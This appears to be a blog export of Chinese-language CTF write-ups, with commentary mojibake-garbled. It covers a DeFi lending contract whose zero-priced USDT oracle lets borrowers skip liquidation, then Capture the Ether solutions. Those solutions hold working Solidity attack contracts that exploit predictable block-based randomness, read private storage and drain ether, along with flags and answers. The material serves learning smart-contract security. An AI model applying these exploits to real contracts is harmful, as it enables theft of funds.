functionCallWithValue(target, data, 0, errorMessage);\n    &#125;\n    function functionCallWithValue(\n        address target,\n        bytes memory data,\n        uint256 value\n    ) internal returns (bytes memory) &#123;\n        return functionCallWithValue(target, data, value, \"Address: low-level call with value failed\");\n    &#125;\n    function functionCallWithValue(\n        address target,\n        bytes memory data,\n        uint256 value,\n        string memory errorMessage\n    ) internal returns (bytes memory) &#123;\n        require(address(this).balance >= value, \"Address: insufficient balance for call\");\n        require(isContract(target), \"Address: call to non-contract\");\n\n        (bool success, bytes memory returndata) = target.call&#123;value: value&#125;(data);\n        return verifyCallResult(success, returndata, errorMessage);\n    &#125;\n    function functionStaticCall(address target, bytes memory data) internal view returns (bytes memory) &#123;\n        return functionStaticCall(target, data, \"Address: low-level static call failed\");\n    &#125;\n    function functionStaticCall(\n        address target,\n        bytes memory data,\n        string memory errorMessage\n    ) internal view returns (bytes memory) &#123;\n        require(isContract(target), \"Address: static call to non-contract\");\n\n        (bool success, bytes memory returndata) = target.staticcall(data);\n        return verifyCallResult(success, returndata, errorMessage);\n    &#125;\n    function functionDelegateCall(address target, bytes memory data) internal returns (bytes memory) &#123;\n        return functionDelegateCall(target, data, \"Address: low-level delegate call failed\");\n    &#125;\n    function functionDelegateCall(\n        address target,\n        bytes memory data,\n        string memory errorMessage\n    ) internal returns (bytes memory) &#123;\n        require(isContract(target), \"Address: delegate call to non-contract\");\n\n        (bool success, bytes memory returndata) = target.delegatecall(data);\n        return verifyCallResult(success, returndata, errorMessage);\n    &#125;\n    function verifyCallResult(\n        bool success,\n        bytes memory returndata,\n        string memory errorMessage\n    ) internal pure returns (bytes memory) &#123;\n        if (success) &#123;\n            return returndata;\n        &#125; else &#123;\n            // Look for revert reason and bubble it up if present\n            if (returndata.length > 0) &#123;\n                // The easiest way to bubble the revert reason is using memory via assembly\n\n                assembly &#123;\n                    let returndata_size := mload(returndata)\n                    revert(add(32, returndata), returndata_size)\n                &#125;\n            &#125; else &#123;\n                revert(errorMessage);\n            &#125;\n        &#125;\n    &#125;\n&#125;\n\nlibrary SafeERC20 &#123;\n    using Address for address;\n\n    function safeTransfer(\n        IERC20 token,\n        address to,\n        uint256 value\n    ) internal &#123;\n        _callOptionalReturn(token, abi.encodeWithSelector(token.transfer.selector, to, value));\n    &#125;\n\n    function safeTransferFrom(\n        IERC20 token,\n        address from,\n        address to,\n        uint256 value\n    ) internal &#123;\n        _callOptionalReturn(token, abi.encodeWithSelector(token.transferFrom.selector, from, to, value));\n    &#125;\n    function safeApprove(\n        IERC20 token,\n        address spender,\n        uint256 value\n    ) internal &#123;\n        require(\n            (value == 0) || (token.allowance(address(this), spender) == 0),\n            \"SafeERC20: approve from non-zero to non-zero allowance\"\n        );\n        _callOptionalReturn(token, abi.encodeWithSelector(token.approve.selector, spender, value));\n    &#125;\n\n    function safeIncreaseAllowance(\n        IERC20 token,\n        address spender,\n        uint256 value\n    ) internal &#123;\n        uint256 newAllowance = token.allowance(address(this), spender) + value;\n        _callOptionalReturn(token, abi.encodeWithSelector(token.approve.selector, spender, newAllowance));\n    &#125;\n\n    function safeDecreaseAllowance(\n        IERC20 token,\n        address spender,\n        uint256 value\n    ) internal &#123;\n        unchecked &#123;\n            uint256 oldAllowance = token.allowance(address(this), spender);\n            require(oldAllowance >= value, \"SafeERC20: decreased allowance below zero\");\n            uint256 newAllowance = oldAllowance - value;\n            _callOptionalReturn(token, abi.encodeWithSelector(token.approve.selector, spender, newAllowance));\n        &#125;\n    &#125;\n    function _callOptionalReturn(IERC20 token, bytes memory data) private &#123;\n\n        bytes memory returndata = address(token).functionCall(data, \"SafeERC20: low-level call failed\");\n        if (returndata.length > 0) &#123;\n            // Return data is optional\n            require(abi.decode(returndata, (bool)), \"SafeERC20: ERC20 operation did not succeed\");\n        &#125;\n    &#125;\n&#125;\nabstract contract Context &#123;\n    function _msgSender() internal view virtual returns (address) &#123;\n        return msg.sender;\n    &#125;\n\n    function _msgData() internal view virtual returns (bytes calldata) &#123;\n        return msg.data;\n    &#125;\n&#125;\n\nabstract contract Pausable is Context &#123;\n    event Paused(address account);\n    event Unpaused(address account);\n\n    bool private _paused;\n    constructor() &#123;\n        _paused = false;\n    &#125;\n    function paused() public view virtual returns (bool) &#123;\n        return _paused;\n    &#125;\n    modifier whenNotPaused() &#123;\n        require(!paused(), \"Pausable: paused\");\n        _;\n    &#125;\n    modifier whenPaused() &#123;\n        require(paused(), \"Pausable: not paused\");\n        _;\n    &#125;\n    function _pause() internal virtual whenNotPaused &#123;\n        _paused = true;\n        emit Paused(_msgSender());\n    &#125;\n    function _unpause() internal virtual whenPaused &#123;\n        _paused = false;\n        emit Unpaused(_msgSender());\n    &#125;\n&#125;\n\ninterface IOracle &#123;\n    function getTokenPrice(address token) external view returns (uint, uint);\n&#125;\n\ncontract Market is Pausable &#123;\n    using SafeERC20 for IERC20;\n\n    struct Position &#123;\n        uint locked;\n        address lockedToken;\n        uint borrowed;\n        address borrowedToken;\n    &#125;\n\n    address public owner;\n    address public oracle;\n    uint public liquidationThreshold; // in bps\n    uint public liquidationBonus; // in bps\n    address constant internal WETH = 0xd0A1E359811322d97991E03f863a0C30C2cF029C;\n    uint constant internal ONE = 10 ** 18;\n    mapping (address => bool) public allowedLockTokens;\n    mapping (address => bool) public allowedBorrowTokens;\n    mapping (address => uint8) public tokenDecimals;\n    mapping (address => Position[]) public positions;\n\n    event CreatePosition(address user, uint pid);\n    event Lock(address user, uint pid, address token, uint amount);\n    event Unlock(address user, uint pid, address token, uint amount);\n    event Borrow(address user, uint pid, address token, uint amount);\n    event Repay(address user, uint pid, address token, uint amount);\n    event Liquidated(address liquidator, address user, uint pid, address token, uint amount);\n\n    modifier onlyOwner() &#123;\n        require(msg.sender == owner, \"onlyOwner\");\n        _;\n    &#125;\n\n    constructor(address _oracle) &#123;\n        owner = msg.sender;\n        oracle = _oracle;\n    &#125;\n\n    function getTokenPrice(address token) internal view returns (uint) &#123;\n        if (token == address(0) || token == WETH) return ONE;\n        (uint price, ) = IOracle(oracle).getTokenPrice(token);\n        return price;\n    &#125;\n\n    function getHealthFactor(Position storage position) internal view returns (uint) &#123;\n        uint lockedTokenPrice = getTokenPrice(position.lockedToken);\n        uint borrowedTokenPrice = getTokenPrice(position.borrowedToken);\n        uint scaledLocked = position.locked * 10 ** (18 - tokenDecimals[position.lockedToken]);\n        uint scaledBorrowed = position.borrowed * 10 ** (18 - tokenDecimals[position.borrowedToken]);\n        uint lockedValue = scaledLocked * lockedTokenPrice / ONE;\n        uint borrowedValue = scaledBorrowed * borrowedTokenPrice / ONE;\n        if (borrowedValue == 0) return ONE;\n        uint healthFactor = lockedValue * liquidationThreshold * ONE / (borrowedValue * 10000);\n        return healthFactor;\n    &#125;\n\n    function getHealthFactor(address user, uint pid) public view returns (uint) &#123;\n        require(pid &lt; positions[user].length, \"InvalidPID\");\n        Position storage position = positions[user][pid];\n        return getHealthFactor(position);\n    &#125;\n\n    function isPositionSafe(Position storage position) internal view returns (bool) &#123;\n        uint healthFactor = getHealthFactor(position);\n        return healthFactor >= ONE;\n    &#125;\n\n    function isPositionSafe(address user, uint pid) public view returns (bool) &#123;\n        require(pid &lt; positions[user].length, \"InvalidPID\");\n        Position storage position = positions[user][pid];\n        return isPositionSafe(position);\n    &#125;\n\n    function createPosition(address lockedToken, address borrowedToken) public whenNotPaused &#123;\n        require(allowedLockTokens[lockedToken] &amp;&amp; allowedBorrowTokens[borrowedToken], \"InvalidToken\");\n        uint pid = positions[msg.sender].length;\n        Position memory position = Position(&#123;\n            locked: 0,\n            lockedToken: lockedToken,\n            borrowed: 0,\n            borrowedToken: borrowedToken\n        &#125;);\n        positions[msg.sender].push(position);\n        emit CreatePosition(msg.sender, pid);\n    &#125;\n\n    function lock(uint pid, uint amount) public payable whenNotPaused &#123;\n        require(pid &lt; positions[msg.sender].length, \"InvalidPID\");\n        Position storage position = positions[msg.sender][pid];\n        position.locked += amount;\n        receiveToken(position.lockedToken, amount);\n        emit Lock(msg.sender, pid, position.lockedToken, amount);\n    &#125;\n\n    function unlock(uint pid, uint amount) public whenNotPaused &#123;\n        require(pid &lt; positions[msg.sender].length, \"InvalidPID\");\n        Position storage position = positions[msg.sender][pid];\n        position.locked -= amount;\n        sendToken(position.lockedToken, amount);\n        require(isPositionSafe(position), \"UnsafePosition\");\n        emit Unlock(msg.sender, pid, position.lockedToken, amount);\n    &#125;\n\n    function borrow(uint pid, uint amount) public whenNotPaused &#123;\n        require(pid &lt; positions[msg.sender].length, \"InvalidPID\");\n        Position storage position = positions[msg.sender][pid];\n        position.borrowed += amount;\n        sendToken(position.borrowedToken, amount);\n        require(isPositionSafe(position), \"UnsafePosition\");\n        emit Borrow(msg.sender, pid, position.borrowedToken, amount);\n    &#125;\n\n    function repay(uint pid, uint amount) public payable whenNotPaused &#123;\n        require(pid &lt; positions[msg.sender].length, \"InvalidPID\");\n        Position storage position = positions[msg.sender][pid];\n        position.borrowed -= amount;\n        receiveToken(position.borrowedToken, amount);\n        emit Repay(msg.sender, pid, position.borrowedToken, amount);\n    &#125;\n\n    function liquidate(address user, uint pid, uint amount) public whenNotPaused &#123;\n        require(pid &lt; positions[user].length, \"InvalidPID\");\n        Position storage position = positions[user][pid];\n        require(!isPositionSafe(position), \"SafePosition\");\n        uint borrowedTokenPrice = getTokenPrice(position.borrowedToken);\n        uint lockedTokenPrice = getTokenPrice(position.lockedToken);\n        uint scaledAmount = amount * 10 ** (18 - tokenDecimals[position.borrowedToken]);\n        uint borrowedValue = scaledAmount * borrowedTokenPrice / ONE;\n        uint scaledLiquidated = borrowedValue * (10000 + liquidationBonus) * ONE / (lockedTokenPrice * 10000);\n        uint liquidated = scaledLiquidated / 10 ** (18 - tokenDecimals[position.lockedToken]);\n        if (liquidated > position.locked) liquidated = position.locked;\n        position.borrowed -= amount;\n        position.locked -= liquidated;\n\n        receiveToken(position.borrowedToken, amount);\n        sendToken(position.lockedToken, liquidated);\n        emit Liquidated(msg.sender, user, pid, position.lockedToken, liquidated);\n    &#125;\n\n    function receiveToken(address token, uint amount) internal &#123;\n        if (token == address(0)) &#123;\n            require(msg.value >= amount, \"NotEnoughFunds\");\n        &#125; else &#123;\n            IERC20(token).safeTransferFrom(msg.sender, address(this), amount);\n        &#125;\n    &#125;\n\n    function sendToken(address token, uint amount) internal &#123;\n        if (token == address(0)) &#123;\n            (bool success,) = msg.sender.call&#123;value: amount&#125;(\"\");\n            require(success, \"SendETHError\");\n        &#125; else &#123;\n            IERC20(token).safeTransfer(msg.sender, amount);\n        &#125;\n    &#125;\n    function pause() public onlyOwner &#123;\n        _pause();\n    &#125;\n    function setAllowedLockToken(address token) public onlyOwner &#123;\n        allowedLockTokens[token] = true;\n    &#125;\n    function setAllowedBorrowToken(address token) public onlyOwner &#123;\n        allowedBorrowTokens[token] = true;\n    &#125;\n    function setTokenDecimals(address token, uint8 decimals) public onlyOwner &#123;\n        tokenDecimals[token] = decimals;\n    &#125;\n    function setLiquidationThreshold(uint _liquidationThreshold) public onlyOwner &#123;\n        liquidationThreshold = _liquidationThreshold;\n    &#125;\n    function setLiquidationBonus(uint _liquidationBonus) public onlyOwner &#123;\n        liquidationBonus = _liquidationBonus;\n    &#125;\n&#125;\n//  0xFf795577d9AC8bD7D90Ee22b6C1703490b6512FD dai  demical:18\n//  0x13512979ADE267AB5100878E2e0f485B568328a4 usdt demical:6\n//  0xad5ce863ae3e4e9394ab43d4ba0d80f419f61789 link demical:18\n//  0xd1b98b6607330172f1d991521145a22bce793277 btc demical:8\n\n\nanalyzeåšè¿™é“é¢˜çš„æ—¶å€™ç®€å•å­¦ä¹ äº†ä¸€ä¸‹defiä¸­å…³äºŽæ¸…ç®—çš„éƒ¨åˆ†ï¼Œè™½ç„¶åœ¨åšé¢˜çš„è¿‡ç¨‹ä¸­åŸºæœ¬ç”¨ä¸åˆ°ï¼Œä½†æ˜¯å¯¹äºŽç†è§£ä»£ç æ€»ä½“çš„åŠŸèƒ½éžå¸¸æœ‰å¸®åŠ©ï¼Œå‚è€ƒï¼šhttps://new.qq.com/omn/20210223/20210223A0BIBO00.html\nåœ¨ç»™å‡ºçš„IOracleåˆçº¦ä¸­å¯ä»¥èŽ·å–ä»£å¸ä»·æ ¼ï¼Œå¯ä»¥å‘çŽ°usdtçš„ä»·æ ¼ä¸º0ï¼Œæ‰€ä»¥åœ¨è®¡ç®—æ—¶borrowvalueå°±ä¼šä¸€ç›´æ˜¯0ï¼Œæ‰€ä»¥issafepositionä¼šä¸€ç›´è¿”å›žtrueï¼Œå°±å¯ä»¥ä¸€ç›´è¿›è¡Œborrowå¹¶ä¸”ä¸ç”¨repayè€Œä¸ä¼šè¢«æ¸…ç®—ï¼Œæ‰€ä»¥å‡¡æ˜¯å€Ÿå‡ºusdtçš„äº¤æ˜“éƒ½æ˜¯å¼‚å¸¸äº¤æ˜“ï¼ŒåŒæ—¶ï¼Œåˆ›å»ºè¿™äº›å¼‚å¸¸positionçš„äº¤æ˜“ä¹Ÿå±žäºŽå¼‚å¸¸äº¤æ˜“ã€‚\nfunction getHealthFactor(Position storage position) internal view returns (uint) &#123;\n       uint lockedTokenPrice = getTokenPrice(position.lockedToken);\n       uint borrowedTokenPrice = getTokenPrice(position.borrowedToken);\n       uint scaledLocked = position.locked * 10 ** (18 - tokenDecimals[position.lockedToken]);\n       uint scaledBorrowed = position.borrowed * 10 ** (18 - tokenDecimals[position.borrowedToken]);\n       uint lockedValue = scaledLocked * lockedTokenPrice / ONE;\n       uint borrowedValue = scaledBorrowed * borrowedTokenPrice / ONE;\n       if (borrowedValue == 0) return ONE;\n       uint healthFactor = lockedValue * liquidationThreshold * ONE / (borrowedValue * 10000);\n       return healthFactor;\n   &#125;\n\n   function getHealthFactor(address user, uint pid) public view returns (uint) &#123;\n       require(pid &lt; positions[user].length, \"InvalidPID\");\n       Position storage position = positions[user][pid];\n       return getHealthFactor(position);\n   &#125;\n\n   function isPositionSafe(Position storage position) internal view returns (bool) &#123;\n       uint healthFactor = getHealthFactor(position);\n       return healthFactor >= ONE;\n   &#125;\n\n   function isPositionSafe(address user, uint pid) public view returns (bool) &#123;\n       require(pid &lt; positions[user].length, \"InvalidPID\");\n       Position storage position = positions[user][pid];\n       return isPositionSafe(position);\n   &#125;\n\nåˆ†æžè¿™æ®µä»£ç å¯ä»¥çœ‹å‡ºæ¥ï¼Œåªè¦borrowä¸º0ï¼Œç»“æžœå°†ä¼šä¸€ç›´è¿”å›žtrue\n0xb09c603ea024b4435d74db07d1f728a80e6e36aeï¼š\n\n0x941c73fBB405a9024C08A52cBEeAF80D02d2B1A1ï¼š\n\n\n0x488daD0ce94f34e33069b8Ae5E16826b63f0F575ï¼š\n\n\nâ€”0x13512979ADE267AB5100878E2e0f485B568328a4æ˜¯usdtä»£å¸çš„åˆçº¦åœ°å€â€”\nç¡®å®šäº†å¼‚å¸¸posotionçš„userå’Œpidï¼Œæµè§ˆhashåˆ¤æ–­å‚æ•°å°±å¯ä»¥äº†ã€‚17ä¸ªborrow+5ä¸ªcreatePositionå…±22ä¸ªhash\nsolveimport hashlib\n\ntxs = [\n'0xf8cb1d747b53bbd4b4346eb8522fa3df36025dafedeb5b19bf54a9fff946ae8a',\n'0x95bc3879debc5ffbe9932d5a60dd53146374e7dd553fef5f00152371bbb75f38',\n'0x0635eeabe77d53672c227c0938f73f43c8f43b984e2c02d4e4a7b4e4d9740a09',\n'0xcfb692d772f8acb90bc14a5da06f72c8ed9d871bbe76787ac0fa8a40e1ef11aa',\n'0x6ce3f133f0d925b125b6d8861b582cfd3b9abc8df4ce6ecd9607751b5fa6e796',\n'0x6287be53eb87e475cfdabfe85c7db800c5262a469a4c270e55b8ddf481b6dae3',\n'0xdd588f3c2a9f25aa57d27e3257fe93882cf211470bd92e56b5271f95ab3c955f',\n'0x8b0b5a0d65a1272d811f1db90cf7a24e43c64cf0d4767a78accf0dd9afce954c',\n'0x3a109f0754113742eaae4bad747261aa7d9a1a9e2fb4d12704631b333b790006',\n'0x6b52684eda64076701e647911f55019fb18b30d980554dd2df5ee0e777506c3a',\n'0xdb3f9da9cc6600ba9c2ca0685cd5c29818dae632fb3be65d530ef404b3ade202',\n'0x13240bc2ce9333db092704b057083d23fa4e365b1b049ea839eb9955591ffd4d',\n'0x657b24138cea98eca019de351d60c69210334926c46d9bfb7a59f5c0db5d16f4',\n'0x6705735d1d4c526cd5db6c5810de6b11ba196fb93715a67ae855d037bfeaeaec',\n'0x8beb80929a026d68fe9e80d0e46dadf43f9b8c68dc1db7e53b996e9654a3c71c',\n'0xea24903d0a72b56457b88bdfd842f4065b0371b9c118dae08aca8dadb43c81b4',\n'0x99a5722bb73a73c6b47967f9b457e888d6503b0f9e1bf23fbf36de56ebad1522',\n'0xef40506ae849c17dfbb75f97331860750217602f9c0a9c7718e50d04f0e233b8',\n'0xc20e2ac5792a3350febd9a7e62527faccf4e07de2c1454572380e6f629ecca18',\n'0xb1f54b9969ba60075775a3168d2ad16482e672cbf386ba4f9d6f433fe9d86fbe',\n'0xcc8ff167cc6a1014f5c4b7445f26b17f68cc95bcc0c578c5330278dda8229d0b',\n'0xf7a6068687cfd85a24c8fd169c3c95133ff7a957c843171733902925990b4b74'\n]\n\n'''\ne.g.,\ntxs = [\n    '0x0000000000000000000000000000000000000000000000000000000000000000',\n    '0x0000000000000000000000000000000000000000000000000000000000000001',\n    '0x0000000000000000000000000000000000000000000000000000000000000002',\n    ...\n]\n'''\nprint(len(txs))\nassert len(txs) == 22\nsalt = b'hint: find abnormal transactions'\nm = hashlib.sha256()\nfor tx_hash in sorted(txs):\n    assert len(tx_hash) == 66 and tx_hash[:2] == '0x'\n    m.update(salt + tx_hash.encode() + m.digest())\nprint(m.hexdigest())\nassert m.hexdigest()[:16] == 'bf22a2d63563554c'\nprint('flag&#123;' + m.hexdigest() + '&#125;')\n\nè¿è¡Œå¾—åˆ°flagï¼šflag{bf22a2d63563554c2073f9480867794e17297ce17c7ec4cc3502979828e4253f}\n\n","slug":"Find-abnormal-transactions","date":"2022-08-02T02:37:38.068Z","categories_index":"","tags_index":"åŒºå—é“¾","author_index":"bcYng"},{"id":"952425ce98802e57d25bf360642d44c0","title":"Capture the ether","content":"\n\n\né¢˜åº“åœ°å€ï¼šhttps://capturetheether.com/\nwarmup1.Deploy a contractCodepragma solidity ^0.4.21;\n\ncontract DeployChallenge &#123;\n    // This tells the CaptureTheFlag contract that the challenge is complete.\n    function isComplete() public pure returns (bool) &#123;\n        return true;\n    &#125;\n&#125;\n\nAttackéžå¸¸ç®€å•çš„ä¸€é“é¢„çƒ­é¢˜ç›®ï¼Œç›´æŽ¥éƒ¨ç½²å†checkå³å¯\n2.Call meCodepragma solidity ^0.4.21;\n\ncontract CallMeChallenge &#123;\n    bool public isComplete = false;\n\n    function callme() public &#123;\n        isComplete = true;\n    &#125;\n&#125;\n\nAttackéƒ¨ç½²é¢˜ç›®åˆçº¦ä¹‹åŽç›´æŽ¥åœ¨remixä¸­ataddresså¹¶è°ƒç”¨callmeå‡½æ•°å°±å¯ä»¥äº†\n3.Choose a nicknameCodepragma solidity ^0.4.21;\n\n// Relevant part of the CaptureTheEther contract.\ncontract CaptureTheEther &#123;\n    mapping (address => bytes32) public nicknameOf;\n\n    function setNickname(bytes32 nickname) public &#123;\n        nicknameOf[msg.sender] = nickname;\n    &#125;\n&#125;\n\n// Challenge contract. You don't need to do anything with this; it just verifies\n// that you set a nickname for yourself.\ncontract NicknameChallenge &#123;\n    CaptureTheEther cte = CaptureTheEther(msg.sender);\n    address player;\n\n    // Your address gets passed in as a constructor parameter.\n    function NicknameChallenge(address _player) public &#123;\n        player = _player;\n    &#125;\n\n    // Check that the first character is not null.\n    function isComplete() public view returns (bool) &#123;\n        return cte.nicknameOf(player)[0] != 0;\n    &#125;\n&#125;\n\nAttackç›´æŽ¥åœ¨åŒºå—é“¾æµè§ˆå™¨æ‰¾åˆ°åˆçº¦åˆ›å»ºçš„msg.senderåœ°å€ï¼Œataddresså†è°ƒç”¨setNicknameå³å¯ï¼Œæ³¨æ„ç¬¬ä¸€ä½ä¸æ˜¯0å³å¯\nLotteries1.Guess the numberCodepragma solidity ^0.4.21;\n\ncontract GuessTheNumberChallenge &#123;\n    uint8 answer = 42;\n\n    function GuessTheNumberChallenge() public payable &#123;\n        require(msg.value == 1 ether);\n    &#125;\n\n    function isComplete() public view returns (bool) &#123;\n        return address(this).balance == 0;\n    &#125;\n\n    function guess(uint8 n) public payable &#123;\n        require(msg.value == 1 ether);\n\n        if (n == answer) &#123;\n            msg.sender.transfer(2 ether);\n        &#125;\n    &#125;\n&#125;\n\nAttackç­”æ¡ˆéƒ½åœ¨åˆçº¦é‡Œè¾¹ç›´æŽ¥ç»™å‡ºäº†ï¼Œ42ä½œä¸ºå‚æ•°è°ƒç”¨guesså°±å¯ä»¥äº†\n2.Guess the secret numberCodepragma solidity ^0.4.21;\n\ncontract GuessTheSecretNumberChallenge &#123;\n    bytes32 answerHash = 0xdb81b4d58595fbbbb592d3661a34cdca14d7ab379441400cbfa1b78bc447c365;\n\n    function GuessTheSecretNumberChallenge() public payable &#123;\n        require(msg.value == 1 ether);\n    &#125;\n    \n    function isComplete() public view returns (bool) &#123;\n        return address(this).balance == 0;\n    &#125;\n\n    function guess(uint8 n) public payable &#123;\n        require(msg.value == 1 ether);\n\n        if (keccak256(n) == answerHash) &#123;\n            msg.sender.transfer(2 ether);\n        &#125;\n    &#125;\n&#125;\n\nAnalyzeè¦æ±‚å°±æ˜¯keccak256åŠ å¯†åŽçš„nç­‰äºŽanswerHashï¼Œæ²¡æœ‰èŽ·å¾—ç­”æ¡ˆçš„é€”å¾„ï¼Œä¸è¿‡å¥½åœ¨nä½¿uint8ï¼ˆ0~255ï¼‰ç±»åž‹ï¼Œè·‘ä¸€ä¸‹å°±å‡ºæ¥äº†.\nAttackpragma solidity ^0.4.21;\ninterface gue&#123;\n    function guess(uint8 n) external payable;\n&#125;\ncontract test&#123;\n    bytes32 answerHash = 0xdb81b4d58595fbbbb592d3661a34cdca14d7ab379441400cbfa1b78bc447c365;\n    function get() public view returns(uint8)&#123;\n        for(uint8 i=0;i&lt;=255;i++)&#123;\n            if(keccak256(i)==answerHash)\n            return i;\n        &#125;\n    &#125;\n    \n&#125;\n\nè·‘å‡ºæ¥ç»“æžœæ˜¯170ï¼Œä½œä¸ºå‚æ•°è°ƒç”¨guesså³å¯\n3.Guess the random numberCodepragma solidity ^0.4.21;\n\ncontract GuessTheRandomNumberChallenge &#123;\n    uint8 answer;\n\n    function GuessTheRandomNumberChallenge() public payable &#123;\n        require(msg.value == 1 ether);\n        answer = uint8(keccak256(block.blockhash(block.number - 1), now));\n    &#125;\n\n    function isComplete() public view returns (bool) &#123;\n        return address(this).balance == 0;\n    &#125;\n\n    function guess(uint8 n) public payable &#123;\n        require(msg.value == 1 ether);\n\n        if (n == answer) &#123;\n            msg.sender.transfer(2 ether);\n        &#125;\n    &#125;\n&#125;\n\nAnalyzeé¢˜ç›®åœ¨éƒ¨ç½²æ—¶å°±æ‰§è¡Œäº†answer &#x3D; uint8(keccak256(block.blockhash(block.number - 1), now))ï¼Œè¯¥å˜é‡å¹¶ä¸å¯è§ï¼Œä½¿ç”¨web3è„šæœ¬èŽ·å¾—ä»¥ä¸‹å˜é‡ï¼Œå¹¶ä¸”ä½œä¸ºå‚æ•°è°ƒç”¨å³å¯\nAttackfrom web3 import Web3,HTTPProvider\nw3=Web3(HTTPProvider('https://ropsten.infura.io/v3/071f682145af4cfc9f0b92a497e89431'))\nbaddress='0xaB61F3485Ea87752d114Ed9912ea8AF771B5eb5F'\naddress=Web3.toChecksumAddress(baddress)\nprint(w3.eth.getStorageAt(address,0).hex())\n\nå¾—å‡ºç»“æžœä¸º0x4e\n4.Guess the new numberCodepragma solidity ^0.4.21;\n\ncontract GuessTheNewNumberChallenge &#123;\n    function GuessTheNewNumberChallenge() public payable &#123;\n        require(msg.value == 1 ether);\n    &#125;\n\n    function isComplete() public view returns (bool) &#123;\n        return address(this).balance == 0;\n    &#125;\n\n    function guess(uint8 n) public payable &#123;\n        require(msg.value == 1 ether);\n        uint8 answer = uint8(keccak256(block.blockhash(block.number - 1), now));\n\n        if (n == answer) &#123;\n            msg.sender.transfer(2 ether);\n        &#125;\n    &#125;\n&#125;\n\nAnalyzeé¢˜ç›®è¦æ±‚n &#x3D;&#x3D; answerï¼Œç›´æŽ¥å†è°ƒç”¨æ—¶è®©n&#x3D;&#x3D;uint8(keccak256(block.blockhash(block.number - 1), now))å°±å¯ä»¥äº†\nAttackcontract attack&#123;\n    GuessTheNewNumberChallenge target=GuessTheNewNumberChallenge(0x8aff539e84B69D78cae8454B9CEf83194d726B24);\n    function pwn() public payable&#123;\n        uint8 answer = uint8(keccak256(block.blockhash(block.number - 1), now));\n        target.guess.value(1 ether)(answer);\n    &#125;\n    function kill(address addr)public payable&#123;\n        selfdestruct(addr);\n    &#125;\n    function() external payable&#123;&#125;\n&#125;\n\n5.Predict the futurepragma solidity ^0.4.21;\n\ncontract PredictTheFutureChallenge &#123;\n    address guesser;\n    uint8 guess;\n    uint256 settlementBlockNumber;\n\n    function PredictTheFutureChallenge() public payable &#123;\n        require(msg.value == 1 ether);\n    &#125;\n\n    function isComplete() public view returns (bool) &#123;\n        return address(this).balance == 0;\n    &#125;\n\n    function lockInGuess(uint8 n) public payable &#123;\n        require(guesser == 0);\n        require(msg.value == 1 ether);\n\n        guesser = msg.sender;\n        guess = n;\n        settlementBlockNumber = block.number + 1;\n    &#125;\n\n    function settle() public &#123;\n        require(msg.sender == guesser);\n        require(block.number > settlementBlockNumber);\n\n        uint8 answer = uint8(keccak256(block.blockhash(block.number - 1), now)) % 10;\n\n        guesser = 0;\n        if (guess == answer) &#123;\n            msg.sender.transfer(2 ether);\n        &#125;\n    &#125;\n&#125;\n\nAnalyzeåˆ†æžuint8 answer &#x3D; uint8(keccak256(block.blockhash(block.number - 1), now)) % 10ä¸€å¥ï¼Œå› ä¸ºè¿›è¡Œäº†mod10ï¼Œæ‰€ä»¥answerä¸€å®šæ˜¯0~9çš„ä¸€ä¸ªæ•°å­—ï¼Œæå‰è®¾ç½®å¥½guessä¸º0 ~9çš„æŸä¸ªæ•°å­—ï¼Œå†åŽ»è°ƒç”¨ï¼Œä¹‹åŽçš„å°±æ˜¯çœ‹è¿æ°”äº†ã€‚\nAttackpragma solidity ^0.4.21;\ninterface predict&#123;\n    function lockInGuess(uint8 n) external payable;\n     function settle() external;\n&#125;\ncontract attack&#123;\n    predict target=predict(0xa3F693043cc55f7a512422eb11cfA2Dc8c0cdE45);\n    uint public a;\n    uint public x;\n    function guess(uint8 n)public payable&#123;\n        target.lockInGuess.value(1 ether)(n);\n        a=n;\n    &#125;\n    function pwn() public payable &#123;\n        x = uint8(keccak256(block.blockhash(block.number - 1), now)) % 10;\n        if(x==a)\n        target.settle();\n    &#125;\n    function trans(address addr)public payable&#123;\n        addr.transfer(this.balance);\n    &#125;\n    function() external payable&#123;&#125;\n&#125;\n\n6.Predict the block hashCodepragma solidity ^0.4.21;\n\ncontract PredictTheBlockHashChallenge &#123;\n    address guesser;\n    bytes32 guess;\n    uint256 settlementBlockNumber;\n\n    function PredictTheBlockHashChallenge() public payable &#123;\n        require(msg.value == 1 ether);\n    &#125;\n\n    function isComplete() public view returns (bool) &#123;\n        return address(this).balance == 0;\n    &#125;\n\n    function lockInGuess(bytes32 hash) public payable &#123;\n        require(guesser == 0);\n        require(msg.value == 1 ether);\n\n        guesser = msg.sender;\n        guess = hash;\n        settlementBlockNumber = block.number + 1;\n    &#125;\n\n    function settle() public &#123;\n        require(msg.sender == guesser);\n        require(block.number > settlementBlockNumber);\n\n        bytes32 answer = block.blockhash(settlementBlockNumber);\n\n        guesser = 0;\n        if (guess == answer) &#123;\n            msg.sender.transfer(2 ether);\n        &#125;\n    &#125;\n&#125;\n\nAnalyzeblock.blockhashè¿™ä¸ªå‡½æ•°ï¼Œå®ƒå¯ä»¥èŽ·å–ç»™å®šçš„åŒºå—å·çš„hashå€¼ï¼Œä½†åªæ”¯æŒæœ€è¿‘çš„256ä¸ªåŒºå—ï¼Œä¸åŒ…å«å½“å‰åŒºå—ï¼Œå¯¹äºŽ256ä¸ªåŒºå—ä¹‹å‰çš„å‡½æ•°å°†è¿”å›ž0\nåœ¨ä¸€ç¬”äº¤æ˜“ä¸­æ— æ³•é¢„æµ‹ä¸‹ä¸€ä¸ªåŒºå—å¯¹åº”çš„å“ˆå¸Œå€¼ï¼Œæ‰€ä»¥å¦‚ä¸‹æ”»å‡»æ–¹å¼ä¸å¯è¡Œ\n\n    contract attack&#123;\n    PredictTheBlockHashChallenge target=PredictTheBlockHashChallenge(0xA7A670A3f4d0fF06CdC836fde83C5e051eBD84a5);\n    uint public y;\n    function pwn() public payable&#123;\n        y=block.number+1;\n        bytes32 key=block.blockhash(y);\n        target.lockInGuess.value(1 ether)(key);\n    &#125;\n    function att()public&#123;\n        target.settle();\n    &#125;\n    function() external payable&#123;&#125;\n&#125;\n\nAttackæ­£ç¡®çš„æ”»å‡»åˆçº¦åº”è¯¥æ˜¯\ncontract attack&#123;\n    PredictTheBlockHashChallenge target=PredictTheBlockHashChallenge(0xA7A670A3f4d0fF06CdC836fde83C5e051eBD84a5);\n    uint public y;\n    function pwn() public payable&#123;\n        y=block.number+1;\n        target.lockInGuess.value(1 ether)(bytes32(0));\n    &#125;\n    function att()public&#123;\n        target.settle();\n    &#125;\n    function trans()public payable&#123;\n        msg.sender.call&#123;value: this.balance&#125;(\"\");\n    &#125;\n    function() external payable&#123;&#125;\n&#125;\n\nMath1.Token saleCodepragma solidity 